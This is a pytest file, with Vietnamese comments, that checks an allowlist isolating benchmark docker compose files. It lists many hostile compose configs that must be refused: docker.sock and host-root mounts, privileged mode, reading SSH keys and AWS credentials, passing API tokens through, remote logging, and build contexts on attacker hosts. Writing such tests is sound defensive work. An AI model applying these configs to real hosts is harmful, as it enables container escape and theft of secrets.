"""P2-15a (fix round 1, PR #92): ALLOWLIST cô lập compose benchmark — OFFLINE, hàm thuần, KHÔNG Docker/mạng.
Mọi case là compose THÙ ĐỊCH (từ báo cáo verify PR92): phải bị từ chối (hoặc, với `ports`, bị xoá) trước khi tới `docker compose`.
Case có chú thích `miss` là những case denylist cũ để lọt."""
import copy
import os

import pytest

from eval.bench import isolation as I

IP = "172.31.250.61"


def base(**svc):
    s = {"image": "alpine:3.20", "ports": ["80:80"]}
    s.update(svc)
    return {"services": {"web": s}}


CASES = {
  # --- expected caught ---
  "docker_sock": base(volumes=["/var/run/docker.sock:/var/run/docker.sock"]),
  "bind_abs": base(volumes=["/:/host"]),
  "bind_rel": base(volumes=["./data:/x"]),
  "bind_parent": base(volumes=["../x:/x"]),
  "bind_home": base(volumes=["~/.ssh:/x"]),
  "bind_var": base(volumes=["${HOME}:/x"]),
  "bind_long": base(volumes=[{"type": "bind", "source": "/", "target": "/h"}]),
  "network_mode_host": base(network_mode="host"),
  "network_mode_container": base(network_mode="container:vg-under-test"),
  "network_mode_service": base(network_mode="service:x"),
  "extra_hosts": base(extra_hosts=["host.docker.internal:host-gateway"]),
  "privileged": base(privileged=True),
  "privileged_str": base(privileged="true"),
  "cap_add": base(cap_add=["NET_ADMIN"]),
  "devices": base(devices=["/dev/kmsg:/dev/kmsg"]),
  "pid_host": base(pid="host"),
  "ipc_host": base(ipc="host"),
  "uts_host": base(uts="host"),
  "userns_host": base(userns_mode="host"),
  "cgroup_host": base(cgroup="host"),
  "seccomp_unconfined": base(security_opt=["seccomp=unconfined"]),
  "apparmor_unconfined": base(security_opt=["apparmor:unconfined"]),
  "sysctls": base(sysctls={"net.ipv4.ip_forward": 1}),
  "dns": base(dns=["8.8.8.8"]),
  "volumes_from": base(volumes_from=["vg-under-test"]),
  "links_external": base(external_links=["vg-under-test"]),
  "build_net_host": base(build={"context": ".", "network": "host"}),
  "top_net_external": {**base(), "networks": {"n": {"external": True, "name": "vglab_llm_net"}}},
  "top_net_macvlan": {**base(), "networks": {"n": {"driver": "macvlan"}}},
  # --- suspected misses ---
  "use_api_socket": base(use_api_socket=True),
  "post_start_privileged": base(post_start=[{"command": ["sh", "-c", "id"], "privileged": True, "user": "root"}]),
  "pre_stop_privileged": base(pre_stop=[{"command": ["sh"], "privileged": True}]),
  "top_volume_driver_opts_bind": {**base(volumes=["sock:/s"]),
                                  "volumes": {"sock": {"driver": "local", "driver_opts": {"type": "none", "o": "bind", "device": "/var/run"}}}},
  "top_volume_external": {**base(volumes=["ext:/s"]), "volumes": {"ext": {"external": True, "name": "vglab_capture_log"}}},
  "long_volume_no_type_relative": base(volumes=[{"source": "./x", "target": "/y"}]),
  "long_volume_type_volume_named_bind": {**base(volumes=[{"type": "volume", "source": "sock", "target": "/s"}]),
                                         "volumes": {"sock": {"driver_opts": {"o": "bind", "device": "/", "type": "none"}}}},
  "include_toplevel": {**base(), "include": ["../../../evil/compose.yml"]},
  "extends_file": base(extends={"file": "../other/docker-compose.yml", "service": "evil"}),
  "env_file_host": base(env_file=["/home/runner/.aws/credentials"]),
  "env_file_long": base(env_file=[{"path": "~/.docker/config.json", "required": False}]),
  "env_passthrough_secret": base(environment=["ANTHROPIC_API_KEY", "GITHUB_TOKEN"]),
  "env_interpolation_secret": base(environment={"K": "${ANTHROPIC_API_KEY}"}),
  "command_interpolation_secret": base(command=["sh", "-c", "echo ${ACTIONS_RUNTIME_TOKEN}"]),
  "logging_gelf_remote": base(logging={"driver": "gelf", "options": {"gelf-address": "udp://203.0.113.5:12201"}}),
  "logging_syslog_remote": base(logging={"driver": "syslog", "options": {"syslog-address": "tcp://203.0.113.5:514"}}),
  "build_context_outside": base(build={"context": "../../../../"}),
  "build_context_abs": base(build={"context": "/"}),
  "build_context_git_url": base(build={"context": "https://github.com/attacker/x.git"}),
  "build_context_remote_github": base(build={"context": "github.com/attacker/x"}),          # #93: compose coi là git context từ xa
  "build_context_remote_github_str": base(build="github.com/attacker/x"),
  "build_context_remote_dotgit": base(build={"context": "evil.example/x.git"}),
  "build_context_remote_ref": base(build={"context": "./app#main"}),
  "build_additional_contexts_host": base(build={"context": ".", "additional_contexts": {"h": "/"}}),
  "build_secret_hostfile": {**base(build={"context": ".", "secrets": ["s"]}), "secrets": {"s": {"file": "/home/runner/.ssh/id_rsa"}}},
  "build_secret_env": {**base(build={"context": ".", "secrets": ["s"]}), "secrets": {"s": {"environment": "GITHUB_TOKEN"}}},
  "build_ssh_agent": base(build={"context": ".", "ssh": ["default"]}),
  "build_entitlements": base(build={"context": ".", "entitlements": ["network.host", "security.insecure"]}),
  "build_privileged": base(build={"context": ".", "privileged": True}),
  "build_net_container": base(build={"context": ".", "network": "container:vg-under-test"}),
  "security_opt_label_disable": base(security_opt=["label=disable"]),
  "security_opt_seccomp_hostfile": base(security_opt=["seccomp=/tmp/allow-all.json"]),
  "security_opt_systempaths": base(security_opt=["systempaths=unconfined"]),
  "deploy_devices_gpu": base(deploy={"resources": {"reservations": {"devices": [{"capabilities": ["gpu"], "count": "all"}]}}}),
  "gpus_all": base(gpus="all"),
  "provider_service": {"services": {"web": {"image": "alpine", "ports": ["80"]},
                                    "p": {"provider": {"type": "evilplugin", "options": {"x": "y"}}}}},
  "volume_leading_space": base(volumes=[" /var/run:/x"]),
  "ports_0000": base(ports=["0.0.0.0:80:80"]),   # stripped by transform -> should NOT appear in output
  "ports_long_host": base(ports=[{"target": 80, "published": "8080", "host_ip": "0.0.0.0"}]),
  "service_non_dict": {"services": {"web": {"image": "a", "ports": ["80"]}, "x": "evil"}},
}

@pytest.mark.parametrize("name", sorted(CASES))
def test_hostile_compose_refused(name):
    cfg = CASES[name]
    snap = copy.deepcopy(cfg)
    try:
        out = I.rewrite_and_check(cfg, IP)
    except (I.UnsafeCompose, ValueError):
        assert cfg == snap                         # đầu vào không bị sửa
        return
    assert cfg == snap, "transform sửa đầu vào"
    assert name.startswith("ports_"), f"ACCEPTED: {name} -> {out}"
    for s in out["services"].values():             # `ports` không bao giờ được publish ra host
        assert "ports" not in s


def test_env_passthrough_refused_before_transform():
    with pytest.raises(I.UnsafeCompose):
        I.assert_bench_compose_safe(base(environment=["ANTHROPIC_API_KEY"]), [IP], "pre")


def test_bare_flag_and_flag_interpolation_still_allowed():
    cfg = base(environment=["FLAG", "A=b"], build={"context": "./app", "args": ["FLAG"]})
    cfg["services"]["web"]["command"] = "echo ${FLAG}"
    I.rewrite_and_check(cfg, IP)


@pytest.mark.parametrize("mut", [
    {"use_api_socket": True}, {"env_file": ["/x"]}, {"logging": {"driver": "gelf"}}, {"gpus": "all"}, {"extends": {"file": "x"}},
    {"volumes": ["sock:/s"]},                       # volume chưa khai báo
])
def test_post_phase_also_allowlisted(mut):
    good = {k: v for k, v in I.rewrite_and_check(base(), IP).items() if k != "x-vg-entry-port"}
    cfg = copy.deepcopy(good)
    cfg["services"]["web"].update(mut)
    with pytest.raises(I.UnsafeCompose):
        I.assert_bench_compose_safe(cfg, [IP], "post")
    cfg = copy.deepcopy(good)
    cfg["include"] = ["x.yml"]
    with pytest.raises(I.UnsafeCompose):
        I.assert_bench_compose_safe(cfg, [IP], "post")


def test_minimal_env_drops_host_secrets(monkeypatch):
    for k in ("ANTHROPIC_API_KEY", "GITHUB_TOKEN", "COMPOSE_FILE", "RELAY_TOKEN"):
        monkeypatch.setenv(k, "secret")
    monkeypatch.setenv("DOCKER_HOST", "unix:///x")
    env = I.minimal_env(FLAG="flag{vg-x}")
    assert env["FLAG"] == "flag{vg-x}" and env["DOCKER_HOST"] == "unix:///x" and "PATH" in env
    assert not {"ANTHROPIC_API_KEY", "GITHUB_TOKEN", "COMPOSE_FILE", "RELAY_TOKEN"} & set(env)
    assert set(env) <= {"PATH", "HOME", "FLAG"} | {k for k in env if k.startswith("DOCKER_")}


@pytest.mark.skipif(os.environ.get("VG_NETWORK_TESTS") != "1", reason="cần mạng (tải tarball ở SHA ghim); CI chạy `bench --lint-selection`")
def test_shipped_selections_pass_allowlist():
    from eval.bench.autopenbench import fetch
    from eval.harness import xbow
    assert xbow.lint() == []                       # 20 XBOW
    assert fetch.lint() == []                      # 5 APB


@pytest.mark.parametrize("ctx", [".", "./app", "app", "app/sub", "./a.b/c"])
def test_local_build_contexts_still_allowed(ctx):
    I.rewrite_and_check(base(build={"context": ctx}), IP)
    I.rewrite_and_check(base(build=ctx), IP)
